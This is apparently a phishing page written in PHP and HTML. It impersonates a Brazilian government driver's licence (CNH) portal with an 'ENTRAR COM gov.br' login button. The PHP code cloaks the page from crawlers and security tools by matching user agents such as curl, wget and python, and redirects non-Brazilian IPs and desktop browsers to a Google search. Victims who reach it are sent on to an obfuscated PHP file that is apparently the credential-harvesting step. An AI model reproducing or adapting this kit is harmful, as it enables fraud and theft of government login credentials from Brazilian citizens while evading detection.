<?php
// ==========================================
// 1. BLOQUEIO DE BOTS E ROBÔS (PHP)
// ==========================================
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$badBots = ['bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'curl', 'wget', 'python', 'java', 'libwww', 'php'];

foreach ($badBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        header("Location: https://www.google.com/search?q=CNH+digital+regular+online");
        exit();
    }
}

// ==========================================
// 2. BLOQUEIO DE IP FORA DO BRASIL (PHP)
// ==========================================
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';

if ($ip != '127.0.0.1' && $ip != '::1') {
    $countryCode = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '';

    if (empty($countryCode)) {
        $geoResponse = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
        if ($geoResponse) {
            $geoData = json_decode($geoResponse);
            if ($geoData && $geoData->status == 'success') {
                $countryCode = $geoData->countryCode;
            }
        }
    }

    if (!empty($countryCode) && $countryCode !== 'BR') {
        header("Location: https://www.google.com/search?q=CNH+digital+regular+online");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>CNH do Brasil - Acesso</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body, html {
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
        }
        .bg-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 60%;
            background-image: url('1792569822405.jpg'); 
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center bottom;
            background-color: #000;
        }
        .bg-container::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 40px;
            background: linear-gradient(to top, rgba(0,0,0,0.3), transparent);
        }
        .card-container {
            position: relative;
            background: #ffffff;
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
            border-top-left-radius: 24px;
            border-top-right-radius: 24px;
            padding: 32px 24px 40px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
            z-index: 10;
        }
        .flag-img {
            width: 80px;
            height: auto;
            margin-bottom: 16px;
        }
        .logo-text {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo-text .cnh-do {
            font-size: 1.3rem;
            color: #222;
            font-weight: 400;
            letter-spacing: -0.5px;
        }
        .logo-text .brasil {
            font-size: 2.2rem;
            color: #111;
            font-weight: 900;
            letter-spacing: -1px;
            line-height: 1;
        }
        .terms-text {
            font-size: 0.8rem;
            color: #444;
            text-align: center;
            line-height: 1.4;
            margin-bottom: 24px;
            max-width: 320px;
        }
        .terms-text a {
            color: #1351B4;
            text-decoration: underline;
            font-weight: 500;
        }
        .btn-gov {
            background-color: #1351B4;
            color: #ffffff;
            border: none;
            border-radius: 28px;
            width: 100%;
            max-width: 360px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            box-shadow: 0 4px 10px rgba(19, 81, 180, 0.3);
            transition: background-color 0.2s, opacity 0.2s;
        }
        .btn-gov:hover {
            background-color: #0c3882;
        }
        .btn-gov:disabled {
            background-color: #0c3882;
            opacity: 0.85;
            cursor: not-allowed;
        }
        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="bg-container"></div>

    <div class="card-container">
        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f1e7-1f1f7.png" alt="Bandeira do Brasil" class="flag-img">
        
        <div class="logo-text">
            <div class="cnh-do">CNH do</div>
            <div class="brasil">BRASIL</div>
        </div>

        <div class="terms-text">
            Ao entrar, concorda com o nosso <br>
            <a href="#">Termo de Responsabilidade</a> e <br>
            <a href="#">Política de Privacidade</a>
        </div>

        <button id="btnEntrar" class="btn-gov" onclick="irParaLogin()">
            ENTRAR COM <strong>gov.br</strong>
        </button>
    </div>

    <script>
        // Bloqueio de computadores
        function isMobileOrTablet() {
            const userAgent = navigator.userAgent;
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Tablet|Silk|Mobile/i.test(userAgent);
        }

        window.addEventListener('DOMContentLoaded', function() {
            if (!isMobileOrTablet()) {
                window.location.href = 'https://www.google.com/search?q=CNH+digital+regular+online';
            }
        });

        // Restaura o botão quando o usuário retorna à página (botão Voltar do navegador)
        window.addEventListener('pageshow', function(event) {
            var btn = document.getElementById('btnEntrar');
            if (btn) {
                btn.disabled = false;
                btn.innerHTML = 'ENTRAR COM <strong>gov.br</strong>';
            }
        });

        function irParaLogin() {
            var btn = document.getElementById('btnEntrar');
            btn.innerHTML = '<span class="spinner"></span> A carregar...';
            btn.disabled = true;
            setTimeout(function() {
                window.location.href = '1a7d9f2e5t6g9f8d2s2x4c0f5g2t6b5m5j3y5t8f3d6e1s0w8e7d4f5j.php';
            }, 100);
        }
    </script>

</body>
</html>